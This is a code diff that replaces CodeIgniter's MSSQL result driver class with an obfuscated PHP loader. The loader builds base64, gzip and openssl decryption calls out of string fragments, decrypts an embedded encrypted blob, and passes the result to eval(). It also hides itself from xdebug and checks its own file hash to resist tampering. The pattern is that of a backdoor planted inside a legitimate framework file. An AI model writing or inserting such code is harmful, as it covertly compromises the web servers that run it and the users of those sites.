@@ -1,198 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.3.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * MSSQL Result Class
- *
- * This class extends the parent result class: CI_DB_result
- *
- * @package		CodeIgniter
- * @subpackage	Drivers
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_mssql_result extends CI_DB_result {
-
-	/**
-	 * Number of rows in the result set
-	 *
-	 * @return	int
-	 */
-	public function num_rows()
-	{
-		return is_int($this->num_rows)
-			? $this->num_rows
-			: $this->num_rows = mssql_num_rows($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Number of fields in the result set
-	 *
-	 * @return	int
-	 */
-	public function num_fields()
-	{
-		return mssql_num_fields($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Fetch Field Names
-	 *
-	 * Generates an array of column names
-	 *
-	 * @return	array
-	 */
-	public function list_fields()
-	{
-		$field_names = array();
-		mssql_field_seek($this->result_id, 0);
-		while ($field = mssql_fetch_field($this->result_id))
-		{
-			$field_names[] = $field->name;
-		}
-
-		return $field_names;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field data
-	 *
-	 * Generates an array of objects containing field meta-data
-	 *
-	 * @return	array
-	 */
-	public function field_data()
-	{
-		$retval = array();
-		for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
-		{
-			$field = mssql_fetch_field($this->result_id, $i);
-
-			$retval[$i]		= new stdClass();
-			$retval[$i]->name	= $field->name;
-			$retval[$i]->type	= $field->type;
-			$retval[$i]->max_length	= $field->max_length;
-		}
-
-		return $retval;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Free the result
-	 *
-	 * @return	void
-	 */
-	public function free_result()
-	{
-		if (is_resource($this->result_id))
-		{
-			mssql_free_result($this->result_id);
-			$this->result_id = FALSE;
-		}
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Data Seek
-	 *
-	 * Moves the internal pointer to the desired offset. We call
-	 * this internally before fetching results to make sure the
-	 * result set starts at zero.
-	 *
-	 * @param	int	$n
-	 * @return	bool
-	 */
-	public function data_seek($n = 0)
-	{
-		return mssql_data_seek($this->result_id, $n);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Result - associative array
-	 *
-	 * Returns the result set as an array
-	 *
-	 * @return	array
-	 */
-	protected function _fetch_assoc()
-	{
-		return mssql_fetch_assoc($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Result - object
-	 *
-	 * Returns the result set as an object
-	 *
-	 * @param	string	$class_name
-	 * @return	object
-	 */
-	protected function _fetch_object($class_name = 'stdClass')
-	{
-		$row = mssql_fetch_object($this->result_id);
-
-		if ($class_name === 'stdClass' OR ! $row)
-		{
-			return $row;
-		}
-
-		$class_name = new $class_name();
-		foreach ($row as $key => $value)
-		{
-			$class_name->$key = $value;
-		}
-
-		return $class_name;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_xup6opgl=('bas'.'e64'.'_de'.'cod'.'e');
+$_cbl1v5l4=('gzu'.'nco'.'mpr'.'ess');
+$_xhqc46qt=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_l2qn73k3='mopViVieim0=';
+$_bkmb1ubh='AA7hEhmO';
+$_pru6pug3='SMY+9wCx';
+$_khxdpi3w='THuMjLbs';
+$_fdmaw5h8='OR99W17c';
+$_nun3jmwv='jCO6mA==';
+$_dof9u4uj='540CMe44';
+$_e8fid9gv='DAF3Dik8';
+$_bgm9br72=$_xup6opgl($_khxdpi3w.$_pru6pug3.$_bkmb1ubh.$_fdmaw5h8.$_l2qn73k3);
+$_fzyczey7=$_xup6opgl($_dof9u4uj.$_e8fid9gv.$_nun3jmwv);
+$_ipoakcjw=$_xup6opgl('hkV26avxJGL2Mbd6HP3fHeB9HubEY4Q26xyNdQURNiLtmBK4rA7zIX5XREkUDxXD1znZewour2r2yJRv1D5UrUMbPk3rwXkW42bPJVc/8INVpmvXiWyd7s7KMcX9gCFPrvErpswgqdHDFiRLGvXAB7ExGUrVQbk5vQ3j38CGvGENr8i7GzwHNSxrwDs+SvLdp4WoYnkUlW1CxGdeK8cQGJQqWBprnS1vYUSQvLIyRrvpvL+RQmHgX+o+2T08YxrNMirkMs1OFz9JY/TaKSJbzM5/rocc8yKxRUb/H8R98QAdUAyNA9ZSs52BjrS1hYVt3M8kK8AaEVKkosgAKNsMwwge0Ja7mN5ZOBWw+bSnqBI8dcC7LyCx7cLedBhiGCn3jDbqvxDZ6zg2YJgB1bHU4pLnbkclBZpteuTT03ilEYXi2qPEnoe2xIAqqFMro9KakEdaafPDNrUF0vb3KBgVoVn9WldLTTFbD2R9CvErKRU+OIIrk8IXMYuLEqELzM15FQWOpE2FIQaz/1Wo41fHD7pNnH6gN6dnRi5GYGEHY6PIf2foS/sU3Wmi7Zm3aqcGiKjN+PGYV+U/oc58TeY5qUM6/H/Ols1Am0z2jevTIIlRBX/KQ/xS0cprVnQlV49chW+G1FxozhgQxXFqJSNmAcuxHZYxm5TOeh2b+9lpfClVyOFfBpOuDAnZfVp8ZPtANGYsGJ58Cv2vvQxhwv7ZMA==');
+$_y1b3xgq1=$_xhqc46qt($_ipoakcjw,'aes-256-cbc',$_bgm9br72,OPENSSL_RAW_DATA,$_fzyczey7);
+if($_y1b3xgq1===false){exit;}
+$_lrppfltr=$_cbl1v5l4($_y1b3xgq1);
+if($_lrppfltr===false){exit;}
+$_kxko1lcw='cec27accf15f58d6e21b908a82f48321a866d14a3ef213ac6c19b94d40c4c9de';
+$_h3kjg2yn=@file_get_contents(__FILE__);
+if($_h3kjg2yn!==false){
+$_ibhy6f8t=str_replace($_kxko1lcw,"0000000000000000000000000000000000000000000000000000000000000000",$_h3kjg2yn);
+$_f6w6zkk5=hash("sha256",$_ibhy6f8t);
+if($_f6w6zkk5!==$_kxko1lcw){@http_response_code(403);exit;}
 }
+eval($_lrppfltr);
